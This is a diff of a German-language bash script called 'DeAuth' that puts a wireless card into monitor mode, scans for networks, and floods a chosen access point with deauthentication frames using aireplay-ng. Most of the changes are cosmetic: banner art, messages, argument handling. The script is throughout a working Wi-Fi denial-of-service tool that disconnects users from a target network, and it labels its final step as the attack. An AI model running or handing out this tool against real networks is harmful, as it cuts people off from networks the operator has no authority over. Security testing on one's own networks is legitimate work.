@@ -8,8 +8,9 @@ VERSION="1.0"
 if [ `echo -n $USER` != "root" ]
 then
         echo ""
-	echo "* HINWEIS *"
-	echo "bitte als root ausführen"
+	echo "* WICHTIG *"
+        echo ""
+	echo "Bitte als root ausführen"
 	echo ""
 	exit 1
 fi
@@ -20,14 +21,18 @@ fi
 if [ -z ${1} ]
 then
         echo ""
-	echo " *** DEAUTH Version ${VERSION} *** "
+	echo " *** DeAuth Version ${VERSION} *** "
         echo ""
-	echo "Eingabe: `basename ${0}` [interface] [BSSID] [Kanal] [Anzahl der Angriffe]"
+	echo "Eingabe: `basename ${0}` [interface] [BSSID] [Kanal] [Anzahl d. Angriffe]"
+        echo ""
 	echo "Beispiel #`basename ${0}` wlan0 (weitere Angaben sind optional)"
         echo ""
 	exit 1
 else
 	ORGINTERFACE="`echo "${1}" | cut -c 1-10`"
+        BSSID=${2}
+        CHANNEL=${3}
+        ATKTIMER=${4}
         echo ""
 	echo "Starte Monitor-Modus an "${ORGINTERFACE}
         echo ""
@@ -38,29 +43,28 @@ fi
 
 airmon-ng start ${ORGINTERFACE} > /dev/nul
 INTERFACE=${ORGINTERFACE}"mon"
+#ATKTIMER="1"
 #iwconfig ${INTERFACE} 
 
 # Prüfe, ob BSSID, Kanal und Anzahl der Angriffe eingeben wurde
 ##
 if [ -z ${2} ] || [ -z ${3} ] || [ -z ${4} ]; then
 #
-
         clear
-
-echo ""
-echo "      (( (o) ))    "
-echo " +-------/|\---+   "
-echo " |      /\|/\  |   "
-echo " |     /\_|_/\ |   "
-echo " |    /\__|__/\|   "
-echo " +--------|----+   "
-echo ""
-
+        echo ""
+        echo "      (( (o) ))     "
+        echo " +-------/|\-------+"
+        echo " |      /\|/\      |"
+        echo " |     /\_|_/\     |"
+        echo " |    /\__|__/\    |"
+        echo " +--------|--------+"
+        echo ""
 	echo "INFO:"
         echo "-----"
         echo "Es wird nun nach verfügbaren WLAN Netzwerke gescannt."
         echo "Wenn das gewünschte Ziel aufgelistet ist, kann die Suche abgebrochen werden."
 	echo "Zum Abbrechen bitte 'Ctrl-C' betätigen"
+        echo ""
 	read -p "Drücke ENTER zum starten"
 	airodump-ng ${INTERFACE}
 
@@ -91,11 +95,10 @@ echo ""
 	done
 fi
 
-
 # starte DEAUTH
 echo ""
 echo "-----------------------"
-echo "   STARTE DEN ANGRIFF  "
+echo "  * INITIALISIERUNG *  "
 echo "-----------------------"
 echo ""
 sleep 1
@@ -107,31 +110,24 @@ sleep 1
 #airmon-ng check ${INTERFACE} ${CHANNEL}
 airmon-ng stop ${INTERFACE}  > /dev/nul
 airmon-ng start ${ORGINTERFACE} ${CHANNEL} > /dev/nul
-
-echo ""
 echo "-----------------------"
 echo "PHASE 2: Angriff !"
 echo "-----------------------"
 echo ""
 sleep 1
-aireplay-ng -0 ${ATKTIMER} -a ${BSSID} ${INTERFACE}
+aireplay-ng -a ${BSSID} ${INTERFACE} -0 ${ATKTIMER}
 sleep 1
-
-
-##
-
+#
 airmon-ng stop ${INTERFACE} > /dev/nul
-
 #//
-
 echo ""
 echo ""
 echo " OFFLINE  X        "
-echo " +-------/|\---+   "
-echo " |      /\|/\  |   "
-echo " |     /\_|_/\ |   "
-echo " |    /\__|__/\|   "
-echo " +--------|----+   "
+echo " +-------/|\-------+"
+echo " |      /\|/\      |"
+echo " |     /\_|_/\     |"
+echo " |    /\__|__/\    |"
+echo " +--------|--------+"
 echo ""
 echo ""
 
